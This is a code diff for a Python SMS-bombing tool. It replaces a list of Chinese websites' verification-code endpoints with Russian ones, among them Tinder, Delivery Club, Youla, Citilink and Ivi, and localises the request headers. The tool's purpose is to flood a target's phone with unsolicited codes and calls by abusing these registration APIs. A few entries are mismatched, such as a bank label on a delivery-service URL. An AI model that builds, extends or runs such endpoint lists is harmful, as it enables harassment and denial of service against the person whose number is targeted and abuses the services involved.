@@ -15,47 +15,31 @@ import time
 def initAPI(phone):
     # 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
     APIList = [
-        ["https://login.ceconline.com/thirdPartLogin.do", 60, "世界经理人", "POST",
-         {"mobileNumber": phone, "method": "getDynamicCode", "verifyType": "MOBILE_NUM_REG", "captcharType": "",
-          "time": str(int(time.time() * 1000))}, ""],
+        ["https://foodband.ru/", 60, "FoodBand.ru", "POST",
+         {"event": "regsendcode", "phone": phone[1:], "session": random.randint(100000, 999999), "g-recaptcha-response": ""}, ""],
 
-        ["http://www.ntjxj.com/InternetWeb/SendYzmServlet", 120, "机动车手机绑定", "POST", {"sjhm": phone},
-         "http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp"],
-
-        ["https://www.itjuzi.com/api/verificationCodes", 60, "IT橘子", "POST", {"account": phone}, ""],
-
-        ["http://yifatong.com/Customers/gettcode", 60, "易法通", "GET",
-         {"rnd": ("%0.3f" % (time.time())), "mobile": phone},
-         "http://yifatong.com/Customers/registration?url="],
-
-        ["http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login", 60, "天津企业登记", "POST",
-         {'MOBILENO': phone, 'TEMP': 1},
+        ["https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", 120, "Tinder", "POST", {"phone_number": phone},
          ""],
 
-        ["http://www.shijiebang.com/a/mobile/vcode/", 120, "世界邦", "GET", {'key': phone},
-         "http://www.shijiebang.com/reg/"],
+        ["https://krasnodar.delivery-club.ru/ajax/user_otp", 60, "Delivery Club", "POST", {"phone": phone}, ""],
+
+        ["https://krasnodar.delivery-club.ru/ajax/user_otp", 60, "Тинькофф", "POST",
+         {'MOBILENO': '+' + phone},
+         ""],
+
+        ["https://youla.ru/web-api/auth/request_code", 120, "Юла", "POST", {'phone': phone},
+         ""],
 
         [
-            "http://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=&cururl=http://reg.ztgame.com/&mpcode=&pwd=&tname=&idcard=",
-            60, "巨人网络", "GET", {'phone': phone}, "http://reg.ztgame.com/"],
+            'https://www.citilink.ru/registration/confirm/phone/+' + phone + '/',
+            60, "Ситилинк", "GET", {'phone': phone}, "http://reg.ztgame.com/"],
 
-        ["http://www.homekoo.com/zhixiao/zt_baoming_ajax_pc_new.php", 180, "尚品宅配", "POST",
-         {"action": "OK", "username": "吕布", "tel": phone, "qq": "", "province": "", "city": "", "kehu_tel_time": "",
-          "tg_id": "296", "sp_type": "986", "num_id": "5",
-          "zhuanti_pages": "http://www.homekoo.com/zhixiao/cuxiao/index.php", "prevurl": ""},
-         "http://www.homekoo.com/zhixiao/cuxiao/index.php"],
+        ["https://api.ivi.ru/mobileapi/user/register/phone/v6", 180, "Ivi", "POST",
+         {"phone": phone},
+         ""],
 
-        ["http://jrh.financeun.com/Login/sendMessageCode3.html", 60, "金融号", "GET", {"mobile": phone, "mbid": "197858"},
-         "http://jrh.financeun.com/Login/jrwLogin?web=jrw"],
-
-        ["https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code",
-         30,
-         "迪卡侬", "POST", {"countryCode": "CN", "mobile": phone}, "https://www.decathlon.com.cn/zh/create"],
-
-        ["http://cta613.org/sendsms.php", 60, "支教", "POST", {"y": "1", "sj": phone}, ""],
-
-        ["http://sns.qnzs.youth.cn/ajax/passportSendSms", 120, "青年之声", "POST", {"mobile": phone},
-         "http://sns.qnzs.youth.cn/user/passport"]
+        ["https://findclone.ru/register", 60, "FindClone Звонок", "GET", {"phone": '+' + phone},
+         ""]
     ]
     return APIList
 
@@ -120,9 +104,9 @@ class Bomb(object):
         super(Bomb, self).__init__()
         self.HEADERS = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
-            'Referer': 'http://10.13.0.1',
+            'Referer': 'http://google,ru',
             'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
+            'accept-language': 'ru-RU;q=0.8,en;q=0.4,ja;q=0.2',
             'cache-control': 'max-age=0',
             "X-Requested-With": "XMLHttpRequest"
         }
